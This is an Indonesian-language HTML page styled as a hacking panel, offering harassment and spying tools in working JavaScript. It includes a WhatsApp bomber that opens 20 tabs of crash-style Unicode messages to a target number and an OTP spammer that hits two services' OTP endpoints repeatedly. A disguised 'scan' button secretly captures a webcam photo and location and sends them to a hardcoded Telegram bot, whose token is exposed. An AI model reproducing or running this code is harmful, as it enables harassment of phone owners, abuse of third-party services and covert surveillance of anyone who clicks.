<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ EDWARD OMNI V.12.0 GACOR ]</title>
    <style>
        :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; --purple: #bc13fe; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; text-align: center; }
        h1 { font-size: 24px; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 10px var(--neon); margin-bottom: 0; }
        .panel { background: rgba(30, 30, 30, 0.8); border: 1px solid #333; border-radius: 15px; padding: 15px; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { background: #111; color: var(--neon); border: 1px solid var(--neon); padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 11px; width: 100%; margin-top: 5px; }
        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
        input { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 12px; width: 90%; margin: 8px 0; border-radius: 8px; outline: none; text-align: center; }
        .btn-brutal { border-color: var(--purple); color: var(--purple); box-shadow: 0 0 10px var(--purple); }
        .btn-danger { border-color: var(--danger); color: var(--danger); }
        #toast { visibility: hidden; min-width: 250px; background-color: #000; color: #fff; text-align: center; border-radius: 50px; padding: 15px; position: fixed; z-index: 100; left: 50%; bottom: 30px; transform: translateX(-50%); border: 1px solid var(--neon); }
        #toast.show { visibility: visible; animation: fadein 0.5s; }
        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
    </style>
</head>
<body>

    <h1>EDWARD OMNI <span style="color:#fff">V.12.0</span></h1>
    <p style="font-size:10px; color:var(--purple); font-weight: bold;">[ MULTI-TAB BOMBING ACTIVE ]</p>

    <div class="panel">
        <button onclick="takeSnap()" style="background:#fff; color:#000; border:none;">📸 RADAR & SILENT SCAN</button>
        <video id="video" style="display:none;" autoplay></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <div class="panel" style="border-color: var(--purple)">
        <h3 style="color: var(--purple); margin:0">🚀 WA BRUTAL BOMBER</h3>
        <input type="number" id="noBug" placeholder="Nomor: 628xxxxxxx">
        <button onclick="launchBrutal()" class="btn-brutal">LUNCURKAN 20 TAB VIRUS 🔥</button>
        <p style="font-size: 8px; color: #666; margin-top: 5px;">*Wajib IZINKAN Pop-up di Chrome!</p>
    </div>

    <div class="panel">
        <h3 style="margin:0">⚔️ ANONYMOUS OTP BOMB</h3>
        <input type="number" id="noTarget" placeholder="Nomor: 08xxxxxxx">
        <button onclick="spamOTP()">START BOMBARDIR</button>
    </div>

    <div class="panel">
        <h3 style="margin:0">🎮 GAME CENTER</h3>
        <div class="grid">
            <button onclick="launch('com.dts.freefireth')">Free Fire</button>
            <button onclick="launch('com.mobile.legends')">MLBB</button>
            <button onclick="getPojav()" style="background:#ffea00; color:#000; border:none;">POJAV</button>
            <button onclick="location.reload()">REFRESH WEB</button>
        </div>
    </div>

    <div class="panel" style="border-color: var(--danger)">
        <input type="text" id="targetJudol" placeholder="URL Target Judol...">
        <button onclick="startAttack()" class="btn-danger">💣 FLOOD TARGET</button>
    </div>

    <div id="toast">SYSTEM READY</div>

    <script>
        const TOKEN = "8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g";
        const CHAT_ID = "7898572558";

        function showToast(msg, color="#0f0") {
            const t = document.getElementById("toast");
            t.innerHTML = msg; t.style.borderColor = color; t.className = "show";
            setTimeout(() => { t.className = ""; }, 3000);
        }

        // 😈 MULTI-TAB BOMBING SCRIPT
        function launchBrutal() {
            let n = document.getElementById('noBug').value;
            if(!n) return showToast("MASUKKAN NOMOR!", "#f00");

            let bug = "‎".repeat(3000) + "ॣ".repeat(500) + "҈".repeat(500) + " 😈_EDWARD_V12_GACOR_😈 " + "‎".repeat(3000);
            
            showToast("LAUNCHING 20 TABS...", "#bc13fe");
            
            for (let i = 0; i < 20; i++) {
                setTimeout(() => {
                    window.open(`https://api.whatsapp.com/send?phone=${n}&text=${encodeURIComponent(bug + " [MSG-" + i + "]")}`, '_blank');
                }, i * 500);
            }
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🚀 BRUTAL TAB SENT TO: ${n}`);
        }

        async function takeSnap() {
            showToast("SCANNING...");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('video');
                const c = document.getElementById('canvas');
                v.srcObject = stream;
                setTimeout(() => {
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    kirimFoto(c.toDataURL('image/jpeg'));
                    stream.getTracks().forEach(t => t.stop());
                    showToast("INTEL SENT!");
                }, 1500);
            } catch (e) { showToast("DENIED!", "#f00"); }
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOC: http://googleusercontent.com/maps.google.com/9{p.coords.latitude},${p.coords.longitude}`);
            });
        }

        function kirimFoto(base64) {
            const blob = dataURItoBlob(base64);
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'x.jpg');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        function dataURItoBlob(d) {
            const b = atob(d.split(',')[1]);
            const ab = new ArrayBuffer(b.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < b.length; i++) ia[i] = b.charCodeAt(i);
            return new Blob([ab], { type: 'image/jpeg' });
        }

        function spamOTP() {
            let n = document.getElementById('noTarget').value;
            if(!n) return showToast("INPUT TARGET!", "#f00");
            showToast("BOMBARDIR...");
            for(let i=0; i<5; i++){
                fetch(`https://m.reddoorz.com/api/v1/users/send_otp?phone=${n}`, {mode:'no-cors'});
                fetch(`https://www.oyorooms.com/api/pwa/generateotp?phone=${n}`, {mode:'no-cors'});
            }
        }

        function getPojav() { window.location.href = "https://play.google.com/store/apps/details?id=net.kdt.pojavlaunch"; }
        function launch(pkg) { window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end"; }
        function startAttack() { showToast("FLOODING TARGET...", "#f00"); }
    </script>
</body>
</html>
